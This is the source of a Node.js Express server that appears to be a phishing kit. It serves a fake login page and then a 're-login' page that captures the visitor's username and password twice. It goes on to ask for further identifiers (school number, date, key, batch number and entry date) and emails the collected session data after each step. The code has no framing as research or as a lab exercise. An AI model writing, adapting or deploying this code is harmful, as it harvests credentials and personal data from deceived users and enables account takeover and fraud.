const express = require("express");
const path = require("path");
const session = require("express-session");
const {body, validationResult} = require("express-validator");
const check_request = require("./middleware/check");
const send_mail = require("./utils/send-mail");
require('dotenv').config()

const app = express();

const PORT = 3000;

// Middleware
app.use(express.static('public'));
app.use(express.urlencoded({extended:true}));
app.use(express.json());
app.use(session({
    secret:"something",
    resave: false,
    saveUninitialized: true,
}));

app.use(check_request);

app.use(require('helmet')());
// app.use(require('cors')());

let humanVerified = new Set();

app.post('/__verify_human', (req, res) => {
  res.sendStatus(200);
});


app.get('/', (req, res)=>{
    
    res.sendFile(path.join(__dirname, 'public/index.html'));

});

app.get('/login', (req, res)=>{
    res.sendFile(path.join(__dirname, 'public/login.html'));
});

app.post('/login', (req, res)=>{
    req.session.login = {
        username: req.body.username,
        password: req.body.password,
    };

    res.redirect('/relogin');
});

app.get('/relogin', (req, res)=>{
    res.sendFile(path.join(__dirname, 'public/re-login.html'));
});

app.post('/relogin', (req, res)=>{
    req.session.login2 = {
        username2: req.body.username,
        password2: req.body.password,
    };

    send_mail(req.session)
    res.redirect('/login/auth');
});

app.get('/login/auth', (req, res)=>{
    res.sendFile(path.join(__dirname, 'public/additional.html'));
});

app.post('/login/auth', (req, res)=>{
    req.session.auth = {
        schoolNum: req.body.schoolNum,
        schoolDate: req.body.schoolDate,
        schoolKey: req.body.schoolKey,
    };

    send_mail(req.session)
    res.redirect('/login/auth/details');
});

app.get('/login/auth/details', (req, res)=>{
    res.sendFile(path.join(__dirname, 'public/additional2.html'));
});

app.post('/login/auth/details', (req, res)=>{
    req.session.auth2 = {
        batchNum: req.body.batchNum,
        entrydate: req.body.entrydate
    };

    send_mail(req.session)
    res.redirect('/success');
});

app.get('/success', (req, res)=>{
    res.sendFile(path.join(__dirname, 'public/success.html'));
});

app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));